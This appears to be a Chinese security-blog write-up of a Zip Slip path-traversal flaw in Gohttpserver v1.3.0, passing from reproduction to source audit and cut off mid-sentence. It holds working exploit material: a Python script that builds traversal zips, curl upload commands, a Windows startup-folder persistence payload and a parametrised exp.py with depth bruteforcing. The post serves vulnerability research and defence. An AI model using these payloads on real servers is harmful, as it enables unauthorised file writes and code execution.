---
title: 深入浅出 Gohttpserver Zip Slip 漏洞：从黑盒复现到白盒源码审计的闭环剖析
url: https://xz.aliyun.com/news/93262
source: 先知安全技术社区
date: 2026-11-12
fetch_date: 2026-11-13T08:56:38.905159
---

# 深入浅出 Gohttpserver Zip Slip 漏洞：从黑盒复现到白盒源码审计的闭环剖析

[先知社区](/)[文章](/news)[视频](/course)[众测](/vuln)[赛事](/ctf)[技能](/skills)[墨白](/mobai)[活动](/events)[名人堂](/hof)[积分商城](/points-mall)

[写文章](/write)

有用收藏打赏分享

# 深入浅出 Gohttpserver Zip Slip 漏洞：从黑盒复现到白盒源码审计的闭环剖析

[![](/images/default-avatar.png)平安喜乐](/users/180158)·2026-11-12 09:57·7 分钟·92·广西·漏洞分析

前言 在日常的 Web 安全研究中，文件上传与解压功能一直是高危漏洞的温床。从 2018 年 Snyk 安全团队首次披露 Zip Slip 漏洞以来，这种利用压缩包内文件名的路径穿越缺陷，广泛存在于各类支持解压的 Web 应用、中间件乃至开发框架中。攻击者通过构造包含 ../ 序列的恶意压缩包，可以绕过应用的上传目录限制，将任意文件写入服务器的敏感位置（如系统配置、计划任务、启动项等），进而实现从…

## 前言

在日常的 Web 安全研究中，文件上传与解压功能一直是高危漏洞的温床。从 2018 年 Snyk 安全团队首次披露 Zip Slip 漏洞以来，这种利用压缩包内文件名的路径穿越缺陷，广泛存在于各类支持解压的 Web 应用、中间件乃至开发框架中。攻击者通过构造包含 ../ 序列的恶意压缩包，可以绕过应用的上传目录限制，将任意文件写入服务器的敏感位置（如系统配置、计划任务、启动项等），进而实现从“任意文件写入（Arbitrary File Write）”到“远程代码执行（RCE）”的致命跨越。

近期，笔者在对开源 HTTP 文件服务器 Gohttpserver 进行代码审计与安全测试时，完整复现了该漏洞的利用链路。Gohttpserver 是一款基于 Go 语言编写、广受好评的轻量级文件服务器，其内置的 --upload 功能极大地方便了日常的文件传输与共享。然而，正是因为其主打“轻量、便捷”，在安全防护的代码实现上存在致命的逻辑缺陷。

本文将以此漏洞为例，带来一次全景式、深度的漏洞分析。文章涵盖从环境搭建、黑盒漏洞复现、白盒源码溯源、自动化 EXP 工程化开发，到进阶的绝对路径变异测试与防御体系构建。旨在通过这一完整的闭环，为安全研究人员提供实战参考，为开发人员敲响警钟。

## 一、 漏洞背景与靶场环境搭建

### 1.1 漏洞概述与影响范围

本次复现的目标为 Gohttpserver v1.3.0 版本（经过笔者的代码比对，甚至在官方最新的 master 分支中，该缺陷依然未被完全修复）。当程序以 --upload 参数启动时，允许用户上传文件。若上传请求中包含 unzip=true 参数，服务端将自动调用内置逻辑解压该 ZIP 文件。

由于解压过程中缺乏对压缩包内部文件名的严格过滤，导致路径穿越（Zip Slip）。这是一个典型的未授权任意文件写入漏洞。在真实的生产环境中，由于很多开发者为了图方便，常常在内部网络或甚至公网直接开启 --upload 功能用于快速传文件，这无疑给攻击者敞开了大门。

### 1.2 多方式靶场环境搭建

为了高度还原攻击场景，我们在本地 Windows 环境下搭建靶机。这里提供两种方案：

#### 方案 A：源码编译/二进制直接运行（推荐，最轻量）

1. 访问官方 GitHub Releases 页面，下载对应版本的二进制文件 gohttpserver\_1.3.0\_windows\_amd64.zip。
2. 解压后，在当前目录打开 CMD 终端，执行启动命令：

   ```
   .\gohttpserver.exe --upload
   ```

#### 方案 B：Docker 部署（适合 Linux 环境复现）

如果是 Linux 靶机，可直接拉取镜像并映射端口，注意必须将 --upload 作为启动参数传给容器内部：

```
docker run -d --name ghs-vuln -p 8000:8000 codeskyblue/gohttpserver --upload
```

环境启动后，使用浏览器访问 http://127.0.0.1:8000。此时页面顶部呈现出清晰的 Upload 按钮，证明文件上传接口已成功开启，靶场准备就绪。

![](https://xzfile.aliyuncs.com/2026/11/12/0943/1c13d270-319.png)

## 二、 漏洞黑盒复现：从任意写入到权限夺取

### 2.1 原理剖析：ZIP 文件结构与路径拼接

要理解 Zip Slip，必须先了解 ZIP 格式的底层结构。一个 ZIP 压缩包由多个文件条目（Entry）组成，每个条目内部不仅保存了文件的二进制数据，还保存了文件的相对路径名。正常情况下的路径可能是 images/avatar.png。

当 Web 应用执行解压时，通常会定义一个“解压目标目录”（如 /var/www/uploads/），然后遍历 ZIP 内部的文件名进行拼接（如 os.path.join('/var/www/uploads/', 'images/avatar.png')）。
但如果在构造 ZIP 时，恶意将内部文件名修改为 ../../../../etc/cron.d/pwn，拼接后的路径就变成了 /var/www/uploads/../../../../etc/cron.d/pwn，这就成功逃逸出了目标目录，实现了文件覆盖。

### 2.2 基础利用：验证任意文件写入

为了生成恶意 ZIP 包，我们直接编写一段 Python 脚本（利用内置的 zipfile 模块），将目标文件名硬编码为穿越路径：

```
import zipfile

with zipfile.ZipFile('evil.zip', 'w') as z:
    # 利用 ../ 逃逸，目标直指当前 Windows 用户的桌面
    z.writestr('../../Desktop/pwned_by_zipslip.txt', 'This file was written outside the web root!\n')
```

![](https://xzfile.aliyuncs.com/2026/11/12/0943/b5366e25-9d3.png)

随后，使用 curl 工具模拟上传操作。注意，这里必须加入表单字段 unzip=true 以触发服务端的解压逻辑：

```
curl -F "file=@evil.zip" -F "unzip=true" http://127.0.0.1:8000/
```

服务器顺利受理请求，并返回了 {"description":"success","success":true}。

![](https://xzfile.aliyuncs.com/2026/11/12/0943/5f1ea4e5-6b7.png)

紧接着，我们无需任何额外的权限验证，即可在 Windows 桌面上发现被写入的 pwned\_by\_zipslip.txt 文件，其内容与脚本中定义的完全一致。这就证明了：攻击者可以跨越 Web 根目录的限制，向任意位置写入任意内容。

### 2.3 进阶利用：通过系统启动项实现 RCE

任意文件写入通常只是前奏。在 Windows 系统中，如果攻击者能够将 .bat、.vbs 或 .exe 文件写入当前用户的启动目录（Startup Folder），那么只要用户重启或重新登录系统，该程序就会被自动执行。这是一种非常隐蔽的持久化后门手法。

我们修改 Python 脚本，将 Payload 替换为启动计算器的批处理命令：

```
z.writestr('../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/calc.bat', 'start calc.exe\n')
```

重复上述上传动作后，按下 Win + R 键，输入 shell:startup 打开系统的启动文件夹。可以看到，名为 calc.bat 的恶意文件已经越权写入。双击运行，一个计算器赫然弹出，这标志着我们成功实现了从“任意文件写入”到“RCE”的完整攻击链闭环。

![](https://xzfile.aliyuncs.com/2026/11/12/0944/8c8e20e1-635.png)

## 三、 白盒审计与底层逻辑剖析：寻找 Source 与 Sink

为了彻底弄清楚漏洞的机理，我们下载 Gohttpserver v1.3.0 的源码，使用 VS Code 打开，展开一次从“污点输入源（Source）”到“危险汇聚点（Sink）”的深度追踪。

### 3.1 定位漏洞入口（Source）

打开处理 HTTP 路由的核心文件 httpstaticserver.go，定位到第 279 行附近。这是文件上传与解压的入口逻辑：

```
if req.FormValue("unzip") == "true" {
    err = unzipFile(dstPath, dirpath)
    os.Remove(dstPath)
    // ...
}
```

![](https://xzfile.aliyuncs.com/2026/11/12/0945/2cefa183-52c.png)

审计结论：req.FormValue("unzip") 直接获取用户通过 HTTP 表单提交的参数。代码中没有任何鉴权机制或白名单校验，只要参数为 true，程序就会毫无防备地调用 unzipFile 函数。dstPath 是上传临时文件的保存路径，dirpath 则是当前浏览的 Web 目标目录。

### 3.2 追踪数据流向（Trace）

我们跟进到 zip.go 文件，看看 unzipFile 函数内部是如何处理压缩包的：

```
for _, f := range zr.File {
    // ...读取文件流...
    filename := sanitizedName(f.Name) // 第 154 行
    if filepath.Base(filename) == ".ghs.yml" {
        continue
    }
    fpath := filepath.Join(dest, filename) // 第 158 行
    // ...
}
```

![](https://xzfile.aliyuncs.com/2026/11/12/0946/736abe1d-421.png)

审计结论：f.Name 是直接从 ZIP 压缩包的元数据中读取的条目文件名，完全处于攻击者的掌控之中。代码试图调用 sanitizedName 进行安全清洗，随后使用 filepath.Join 将目标目录 dest 与 filename 进行路径拼接。这里还发现了一个黑名单机制：只针对 .ghs.yml 进行了拦截，这显然是治标不治本的。

### 3.3 剖析防御失效点（伪安全）

为什么 sanitizedName 没有发挥作用？我们向上追溯该函数的代码实现：

```
func sanitizedName(filename string) string {
    if len(filename) > 1 && filename[1] == ':' && runtime.GOOS == "windows" {
        filename = filename[2:] // 针对Windows盘符的截断
    }
    filename = strings.TrimLeft(strings.Replace(filename, `\`, "/", -1), `/`)
    filename = filepath.ToSlash(filename)
    filename = filepath.Clean(filename) // 第 31 行：致命缺陷
    return filename
}
```

![](https://xzfile.aliyuncs.com/2026/11/12/0947/1dff9718-653.png)

根因分析：
filepath.Clean 这个函数非常具有迷惑性，很多开发者以为它等同于安全过滤。但查阅 Go 官方文档可知，Clean 仅仅是对路径进行词法上的规范化处理（例如把 a//b 变成 a/b，把 a/../b 变成 a/b，或者处理前导斜杠）。
它绝对不会拦截 .. 序列！ 比如传入 ../../Desktop/calc.bat，经过 Clean 处理后依然是 ../../Desktop/calc.bat。这里的“清洗”仅仅是统一了路径格式，将这种恶意路径原封不动地传递给了下一个环节。

### 3.4 最终触发点（Sink）

来看最后真正导致文件写入的危险操作：

```
os.MkdirAll(filepath.Dir(fpath), os.ModePerm) // 创建父目录
outFile, err := os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode()) // 第 176 行：危险Sink
if err != nil {
    return err
}
_, err = io.Copy(outFile, rc)
```

![](https://xzfile.aliyuncs.com/2026/11/12/0947/45f3d071-6e5.png)

审计结论：由于 fpath 在 filepath.Join 时已经被恶意路径污染，此时 fpath 已经指向了 Web 根目录之外的系统敏感位置。os.OpenFile 函数会忠实地按照这个绝对路径去创建文件，并将 ZIP 内的 Payload 数据通过 io.Copy 写入其中。至此，完美的任意文件写入利用链彻底闭环。

## 四、 迈向实战：复现脚本的工程化进阶

在黑盒复现中，硬编码路径（如固定写死 ../../Desktop/）只能在特定环境下成功。但在真实的红队渗透测试中，目标服务器的部署路径深度未知，操作系统未知。为了提升实战打击效率和武器化水平，我们必须对 EXP 进行工程化改造。

### 4.1 编写标准自动化 EXP 脚本

我们使用 Python 的 argparse 库开发了标准的 EXP 脚本 exp.py。该脚本允许测试者动态传入目标 URL、写入路径、文件内容和路径穿越深度。

核心代码逻辑如下：

```
def generate_evil_zip(zip_name, target_file, payload_content, traverse_depth):
    traversal_path = "../" * traverse_depth
    evil_filename = traversal_path + target_file.replace("\\", "/")
    with zipfile.ZipFile(zip_name, 'w') as z:
        z.writestr(evil_filename, payload_content)
```

![](https://xzfile.aliyuncs.com/2026/11/12/0947/60237b4f-627.png)

通过引入 -d（Depth）参数，脚本可以自动计算需要拼接多少个 ../，真正实现了跨平台、跨目录的通用利用。

### 4.2 一键化 RCE 验证

利用工程化脚本，我们可以轻松执行更复杂的攻击逻辑。例如，一键向启动项写入反弹 Shell 或恶意 Payload：

```
python exp.py -u http://127.0.0.1:8000 -f "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/auto_rce.bat" -c "start calc.exe" -d 2
```

![](https://xzfile.aliyuncs.com/2026/11/12/0948/059a10b8-889.png)

红队实战盲测思路：
在真实的黑盒场景下，攻击者如果在不确定 Web 根目录深度时该怎么办？
通常会使用深度递增爆破法：先尝试 -d 1，再尝试 -d 2、-d 3。通过在 Payload 中写入特定指纹，随后通过 HTTP 请求尝试访问该文件，或观察目标系统的状态变化，以此来探测出服务器真实的物理路径层级。

## 五、 进阶探索：绝对路径变异与防御机制绕过分析

在进行 Zip Slip 漏洞利用时，业内还流传着一种非常经典的变体攻击：绝对路径攻击。在很多编程语言中，如果路径拼接函数的后一个参数是绝对路径（如 Linux 下的 /etc/passwd，或 Windows 下的 C:\Windows\），函数会直接抛弃前一个参数，从而无视任何防御。

那么，Gohttpserver 是否也会中招呢？我们决定进行深度探索。

我们使用工程化脚本，尝试直接写入系统绝对路径（参数 -d 0 代表不添加任何 ../）：

```
python exp.py -u http://127.0.0.1:8000 -f "C:\Windows\System32\pwn_abs.txt" -c "Absolute Path Test" -d 0
```

![](https://xzfile.aliyuncs.com/2026/11/12/0949/f580da1b-c05.png)

实验现象：随后，我们检查了 C:\Windows\System32 目录，发现目标文件并未写入系统核心目录。反之，在 Gohttpserver 当前所在的程序目录下（即 .../gohttpserver\_1.3.0\_windows\_amd64/Windows/System32/pwn\_abs.txt），多出了被写入的文件。

#### 深度剖析：为什么绝对路径攻击失效了？

造成这一现象的原因主要有两点：

1. 源码中的盘符截断：回看 sanitizedName 函数，针对 Windows 环境有一行特殊判断：if len(filename) > 1 && filename[1] == ':' { filename = filename[2:] }。这意味着攻击者传入的 C: 被直接截断，绝对路径降级成了 \Windows\System32。
2. Go 语言 filepath....